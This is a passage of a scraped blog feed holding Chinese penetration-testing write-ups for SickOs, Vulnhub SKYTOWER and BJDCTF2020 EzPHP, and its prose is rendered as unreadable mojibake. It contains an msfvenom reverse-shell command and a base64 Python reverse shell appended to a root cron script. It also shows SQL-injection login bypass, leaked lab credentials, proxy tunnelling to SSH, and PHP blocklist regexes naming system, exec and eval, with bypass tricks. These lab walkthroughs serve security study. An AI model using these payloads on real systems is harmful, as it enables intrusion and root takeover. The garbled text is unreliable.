<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">www-data@SickOs:/etc/cron.d$ <span class="token function">cat</span> auto*
<span class="token function">cat</span> auto*

* * * * * root /usr/bin/python /var/www/connect.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>å®šæ—¶æ‰§è¡Œconnect.pyæ–‡ä»¶<br>msfvenomç”Ÿæˆåå¼¹shellpayload<br><code>msfvenom -p cmd/unix/reverse_python LHOST=192.168.206.138 LPORT=4444 -f raw</code><br><img src="https://img-blog.csdnimg.cn/direct/28429ce94bbc46aa8b8c96af7cfe01e7.png" alt="123"></p>
<p>å†™å…¥æ–‡ä»¶</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">www-data@SickOs:/etc/cron.d$ <span class="token builtin class-name">echo</span> <span class="token string">"exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCAgICAgLCAgICBzdWJwcm9jZXNzICAgICAsICAgIG9zOyAgICAgICAgaG9zdD0iMTkyLjE2OC4yMDYuMTM4IjsgICAgICAgIHBvcnQ9NDQ0NDsgICAgICAgIHM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCAgICAgLCAgICBzb2NrZXQuU09DS19TVFJFQU0pOyAgICAgICAgcy5jb25uZWN0KChob3N0ICAgICAsICAgIHBvcnQpKTsgICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgLCAgICAwKTsgICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgLCAgICAxKTsgICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgLCAgICAyKTsgICAgICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ==')[0]))"</span> <span class="token operator">>></span> /var/www/connect.py
<span class="token operator">&lt;</span>KCIvYmluL2Jhc2giKQ<span class="token operator">==</span><span class="token string">')[0]))" >> /var/www/connect.py                         
www-data@SickOs:/etc/cron.d$ cat /var/www/connect.py
cat /var/www/connect.py
#!/usr/bin/python

print "I Try to connect things very frequently\n"
print "You may want to try my services"
exec(__import__('</span>base64<span class="token string">').b64decode(__import__('</span>codecs<span class="token string">').getencoder('</span>utf-8<span class="token string">')('</span>aW1wb3J0IHNvY2tldCAgICAgLCAgICBzdWJwcm9jZXNzICAgICAsICAgIG9zOyAgICAgICAgaG9zdD0iMTkyLjE2OC4yMDYuMTM4IjsgICAgICAgIHBvcnQ9NDQ0NDsgICAgICAgIHM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCAgICAgLCAgICBzb2NrZXQuU09DS19TVFJFQU0pOyAgICAgICAgcy5jb25uZWN0KChob3N0ICAgICAsICAgIHBvcnQpKTsgICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgLCAgICAwKTsgICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgLCAgICAxKTsgICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgLCAgICAyKTsgICAgICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ<span class="token operator">==</span>'<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">))</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>ç„¶åkaliç›‘å¬4444ç«¯å£ï¼Œç­‰å¾…ç‰‡åˆ»ã€‚ã€‚ã€‚<br><img src="https://img-blog.csdnimg.cn/direct/b33aca2418054003a3ea827c420348af.png" alt="123"></p>
]]></content>
      <categories>
        <category>é¶åœº</category>
      </categories>
  </entry>
  <entry>
    <title>Vulnhub-SKYTOWER</title>
    <url>/2024/03/02/Vulnhub-SKYTOWER/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>ä½¿ç”¨nmapæ‰«æä¸»æœºè¿›è¡Œä¿¡æ¯æ”¶é›†</p>
<blockquote>
<p>nmap 192.168.206.151 -p- -A -SV</p>
</blockquote>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Starting Nmap <span class="token number">7.92</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-03-02 <span class="token number">14</span>:11 CST
Stats: <span class="token number">0</span>:00:05 elapsed<span class="token punctuation">;</span> <span class="token number">0</span> hosts completed <span class="token punctuation">(</span><span class="token number">1</span> up<span class="token punctuation">)</span>, <span class="token number">1</span> undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About <span class="token number">7.96</span>% <span class="token keyword">done</span><span class="token punctuation">;</span> ETC: <span class="token number">14</span>:12 <span class="token punctuation">(</span><span class="token number">0</span>:00:23 remaining<span class="token punctuation">)</span>
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.206.151
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00070s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65532</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT     STATE    SERVICE    VERSION
<span class="token number">22</span>/tcp   filtered <span class="token function">ssh</span>
<span class="token number">80</span>/tcp   <span class="token function">open</span>     http       Apache httpd <span class="token number">2.2</span>.22 <span class="token variable"><span class="token punctuation">((</span>Debian<span class="token punctuation">))</span></span>
<span class="token operator">|</span>_http-title: Site doesn't have a title <span class="token punctuation">(</span>text/html<span class="token punctuation">)</span>.
<span class="token operator">|</span>_http-server-header: Apache/2.2.22 <span class="token punctuation">(</span>Debian<span class="token punctuation">)</span>
<span class="token number">3128</span>/tcp <span class="token function">open</span>     http-proxy Squid http proxy <span class="token number">3.1</span>.20
<span class="token operator">|</span>_http-title: ERROR: The requested URL could not be retrieved
<span class="token operator">|</span>_http-server-header: squid/3.1.20
MAC Address: 00:0C:29:82:E8:ED <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>
Device type: general purpose
Running: Linux <span class="token number">3</span>.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux <span class="token number">3.2</span> - <span class="token number">3.10</span>, Linux <span class="token number">3.2</span> - <span class="token number">3.16</span>
Network Distance: <span class="token number">1</span> hop

TRACEROUTE
HOP RTT     ADDRESS
<span class="token number">1</span>   <span class="token number">0.70</span> ms <span class="token number">192.168</span>.206.151

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">40.61</span> seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>ä¿¡æ¯æ•´ç†ï¼š<br>å¼€æ”¾ç«¯å£ï¼š22ï¼ˆsshï¼‰ 80ï¼ˆhttpï¼‰ 3128ï¼ˆä»£ç†ç«¯å£ï¼‰</p>
<h2 id="webé¡µé¢"><a href="#webé¡µé¢" class="headerlink" title="webé¡µé¢"></a>webé¡µé¢</h2><p>è®¿é—®80ç«¯å£è¿›è¡Œç›®å½•æ‰«æå‘ç°ä¸‰ä¸ªæ–‡ä»¶<br><img src="https://img-blog.csdnimg.cn/direct/51b00da8b31a487d9db8779f35d5f1cc.png" alt="123"><br>ä¸»é¡µé¢æ˜¯ä¸€ä¸ªç™»å½•çª—å£<br><img src="https://img-blog.csdnimg.cn/direct/382e43ac70da4eca993b41258eb05430.png" alt="213"><br>å°è¯•è¿›è¡Œå¼±å£ä»¤ç™»å½•æ— æœï¼Œæµ‹è¯•SQLæ³¨å…¥ã€‚<br>å‘ç°å­˜åœ¨sqlæ³¨å…¥<br><img src="https://img-blog.csdnimg.cn/direct/5e8ab8649f634da29b8532146ff9682f.png" alt="123"><br>å¤šæ¬¡æµ‹è¯•åå‘ç°å¯ä»¥æˆåŠŸç™»å½•<br><img src="https://img-blog.csdnimg.cn/direct/8930a7299c664de388f3ba4d37932f72.png" alt="456"><br>ç»™å‡ºäº†è´¦å·å¯†ç <code>john/hereisjohn</code><br><img src="https://img-blog.csdnimg.cn/direct/67a0398fa2284aae8891c68881d059e1.png" alt="45"><br>ä½¿ç”¨è¯¥è´¦å·å¯†ç ç™»å½•ç½‘é¡µä¸è¡Œï¼Œsshä¹Ÿæ— ååº”ï¼Œæƒ³èµ·æ”¶é›†ä¿¡æ¯æ—¶å‘ç°3128ç«¯å£å¼€å¯äº†ä»£ç†ï¼Œé‚£ä¹ˆä½¿ç”¨ä»£ç†å·¥å…·proxytunnelè¿›è¡Œè®¿é—®ã€‚</p>
<h2 id="proxytunnel"><a href="#proxytunnel" class="headerlink" title="proxytunnel"></a>proxytunnel</h2><p>proxytunnelæ˜¯ä¸€æ¬¾åˆ©ç”¨http connectionå°è£…æŠ€æœ¯å»ºç«‹éš§é“çš„å·¥å…·ã€‚<br>é€‚ç”¨æ¡ä»¶<br>é˜²ç«å¢™ç¦æ­¢DNSå’ŒICMPéš§é“ï¼Œåªå…è®¸ä»£ç†æœåŠ¡å™¨ä¸Šç½‘çš„æƒ…æ™¯ã€‚</p>
<p>proxytunnelå¸¸ç”¨å‘½ä»¤<br>-a                   æŒ‡å®šæœ¬åœ°ä¾¦å¬ç«¯å£</p>
<p>-p                   ä½¿ç”¨ä»£ç†</p>
<p>-r                    ä½¿ç”¨ç¬¬äºŒä¸ªä»£ç†</p>
<p>-d                   æŒ‡å®šè®¿é—®çš„ç›®æ ‡å’Œç«¯å£<br>kaliè‡ªå¸¦è¯¥å·¥å…·</p>
<blockquote>
<p><code>proxytunnel  -p 192.168.206.151:3128 -d 127.0.0.1:22 -a 6666</code></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/direct/9562b8ee604943e3ba8a07e2c8001a11.png" alt="123"></p>
<h2 id="è¿æ¥ssh"><a href="#è¿æ¥ssh" class="headerlink" title="è¿æ¥ssh"></a>è¿æ¥ssh</h2><p>å¼€å¯å»ºç«‹åæ‰“å¼€å¦ä¸€ä¸ªç»ˆç«¯è¿›è¡Œsshè¿æ¥ï¼Œå‘ç°è¿æ¥ä¸Šä¹‹åå°±ä¼šç«‹å³æ–­å¼€<br><img src="https://img-blog.csdnimg.cn/direct/134e48a161034a7583f63e5f25585fcf.png" alt="456"></p>
<p>æ¶‰åŠåˆ°äº†<code>.bashrc</code>æ–‡ä»¶ï¼Œåœ¨åŠ è½½shellçš„æ—¶å€™ç”±äº<code>.bashrc</code>æ–‡ä»¶çš„é…ç½®ï¼Œbash åœ¨æ¯æ¬¡å¯åŠ¨æ—¶éƒ½ä¼šåŠ è½½ .bashrc æ–‡ä»¶çš„å†…å®¹ã€‚æ¯ä¸ªç”¨æˆ·çš„ home ç›®å½•éƒ½æœ‰è¿™ä¸ª shell è„šæœ¬ã€‚å®ƒç”¨æ¥å­˜å‚¨å¹¶åŠ è½½ä½ çš„ç»ˆç«¯é…ç½®å’Œç¯å¢ƒå˜é‡ã€‚<br>æœ‰å¯èƒ½<code>.bashrc</code>æ–‡ä»¶å†™æœ‰å…³é—­shellçš„å†…å®¹ï¼Œè¿™é‡Œæœ‰ä¸¤ä¸ªæ–¹æ³•ï¼š<br>ç¬¬ä¸€ï¼šåˆ é™¤.bashrcæ–‡ä»¶ï¼ˆæœ‰é£é™©ï¼‰<br>ç¬¬äºŒï¼šä½¿ç”¨-t æ¥å¼€å¯ä¸€ä¸ªç»ˆç«¯</p>
<blockquote>
<p>ssh <a href="mailto:&#x6a;&#111;&#x68;&#110;&#x40;&#49;&#50;&#x37;&#46;&#48;&#x2e;&#48;&#x2e;&#x31;">&#x6a;&#111;&#x68;&#110;&#x40;&#49;&#50;&#x37;&#46;&#48;&#x2e;&#48;&#x2e;&#x31;</a> -p 6666 -t â€œ&#x2F;bin&#x2F;&#x2F;shâ€ </p>
</blockquote>
<p>ä½¿ç”¨ç¬¬äºŒç§<br>è¿æ¥å®Œæˆä¹‹åå¯¹é¶æœºè¿›è¡Œä¿¡æ¯æ”¶é›†ï¼Œæ‰¾åˆ°login.phpä¸­å­˜åœ¨æ•°æ®åº“è´¦å·å¯†ç <br><img src="https://img-blog.csdnimg.cn/direct/80429c4272d7467bb82055fef168896a.png" alt="456"><br>è¿æ¥æ•°æ®åº“åå‘ç°å¦å¤–ä¸¤ä¸ªç”¨æˆ·ï¼ŒæŸ¥çœ‹&#x2F;homeä¸‹ç¡®å®å­˜åœ¨ã€‚<br><img src="https://img-blog.csdnimg.cn/direct/0eca6ffdb4534c6f9d9737e315693be4.png" alt="123"></p>
<p>saraå¯ä»¥è¿æ¥ï¼Œwilliamä¸å¯ä»¥ã€‚è¿æ¥åå‘ç°saraç”¨æˆ·å­˜åœ¨ä¸€å®šçš„rootæƒé™<br><img src="https://img-blog.csdnimg.cn/direct/f7fd2f112f864ce0bd1ae9d831d95ab0.png" alt="789"><br>æŸ¥çœ‹rootç›®å½•ä¸‹çš„flag.txtæ–‡ä»¶å‘ç°æœ‰rootå¯†ç <br><img src="https://img-blog.csdnimg.cn/direct/837b5f62fa1842188b881a0b00844608.png" alt="456"><br>è¿æ¥sshï¼Œæ‹¿åˆ°flagã€‚<br><img src="https://img-blog.csdnimg.cn/direct/472f4411a17e45bbad93ea73a3468ef7.png" alt="456"></p>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>ä»¥SQLæ³¨å…¥ä¸ºå…¥å£æ‰¾åˆ°è´¦å·å¯†ç ï¼Œæ­å»ºä»£ç†éš§é“åè¿æ¥sshï¼Œåœ¨login.phpæ–‡ä»¶ä¸‹å‘ç°æ•°æ®åº“è´¦å·å¯†ç ã€‚é€šè¿‡æ•°æ®åº“æŸ¥åˆ°å…¶ä»–ç”¨æˆ·çš„è´¦å·å¯†ç ï¼Œå‘ç°saraç”¨æˆ·å­˜åœ¨rootæƒé™ï¼Œåœ¨rootä¸‹å‘ç°rootå¯†ç ï¼Œç„¶åè¿æ¥sshæ‹¿åˆ°rootä¸‹çš„flagã€‚</p>
]]></content>
      <categories>
        <category>é¶åœº</category>
      </categories>
  </entry>
  <entry>
    <title>BJDCTF2020-EzPHP</title>
    <url>/2024/03/01/BJDCTF2020-EzPHP/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="BJDCTF2020-EzPHP"><a href="#BJDCTF2020-EzPHP" class="headerlink" title="[BJDCTF2020]EzPHP"></a>[BJDCTF2020]EzPHP</h2><p>è¿™é“é¢˜çœŸçš„ä¸é”™å“ğŸ˜”ï¼Œå¤ç°ä¸€ä¸‹<br>æ‰“å¼€é¢˜ç›®åæŸ¥çœ‹æºç å‘ç°èµ·é‚£é¢æœ‰ä¸€æ®µå¯†æ–‡ï¼Œbase32è§£å¯†åä¸ºä¸€ä¸ªæ–‡ä»¶å<strong>1nD3x.php</strong>ï¼Œè®¿é—®è¯¥æ–‡ä»¶ï¼šï¼ˆçœ‹åˆ°å¤§æ®µçš„å°±åƒshi~~ï¼‰<br>æºç å¦‚ä¸‹ï¼š</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 

<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"1nD3x.php"</span><span class="token punctuation">;</span>
<span class="token variable">$shana</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'shana'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$passwd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$arg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
<span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>

<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br />&lt;font color=red>&lt;B>This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B>&lt;br>&lt;/font>"</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
    <span class="token keyword">if</span> <span class="token punctuation">(</span>
        <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token punctuation">)</span>  
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'You seem to want to do something bad?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/http|https/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^aqua_is_cute$/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'debu'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'debu'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'aqua_is_cute'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Neeeeee! Good Job!&lt;br>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> 
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'fxck you! What do you want to do ?!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-zA-Z]/i'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'fxck you! I hate English!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token punctuation">&#125;</span> 
<span class="token punctuation">&#125;</span> 

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'debu_debu_aqua'</span><span class="token punctuation">)</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Aqua is the cutest five-year-old child in the world! Isn't it ?&lt;br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$shana</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$passwd</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$shana</span> <span class="token operator">!=</span> <span class="token variable">$passwd</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Very good! you know my password. But what is flag?&lt;br>"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck you! you don't know my password! And you don't know sha1! why you come here!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[a-z0-9]*$/isD'</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token operator">||</span> 
<span class="token class-name">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i'</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span> 
    <span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>
    <span class="token variable">$code</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">&#125;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>okokè§£é‡Šä¸€ä¸‹å§</p>
<h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
    <span class="token keyword">if</span> <span class="token punctuation">(</span>
        <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token punctuation">)</span>  
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'You seem to want to do something bad?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>QUERY_STRINGå°±æ˜¯é—®å·åé¢çš„æ•°æ®<br><img src="https://img-blog.csdnimg.cn/direct/b07e8e63d63146e987217970071e1079.png" alt="456"><br>ä¹Ÿå°±æ˜¯è¯´é—®å·åé¢çš„æ•°æ®ä¸èƒ½å‡ºç°æ­£åˆ™åŒ¹é…é‡Œçš„å­—ç¬¦<br>ç”±äº<code>$_SERVER[&#39;QUERY_STRING&#39;]</code>ä¸å¯ä»¥è¿›è¡Œurldecodeï¼Œè€Œ<code>$_GET[]</code>å¯ä»¥ï¼Œå› æ­¤å¯ä»¥ç”¨urlå…¨ç¼–ç ç»•è¿‡æ­£åˆ™</p>
<h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/http|https/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^aqua_is_cute$/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'debu'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'debu'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'aqua_is_cute'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Neeeeee! Good Job!&lt;br>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> 
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'fxck you! What do you want to do ?!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>/^aqua_is_cute$/</code>å¼€å¤´ç»“å°¾éƒ½æ˜¯<strong>aqua_is_cute</strong><br>å°±æ˜¯è¯´ä¼ å…¥debuçš„å­—ç¬¦ä¸èƒ½ç­‰äº<strong>aqua_is_cute</strong>è€Œä¸”è¿˜è¦æ»¡è¶³æ­£åˆ™è¡¨è¾¾å¼ï¼Œï¼ˆä½¿ç”¨æ¢è¡Œ%0aæ¥ç»•è¿‡æ­£åˆ™åŒ¹é…ï¼‰<br>debu&#x3D;aqua_is_cute%0a</p>
<h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-zA-Z]/i'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'fxck you! I hate English!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token punctuation">&#125;</span> 
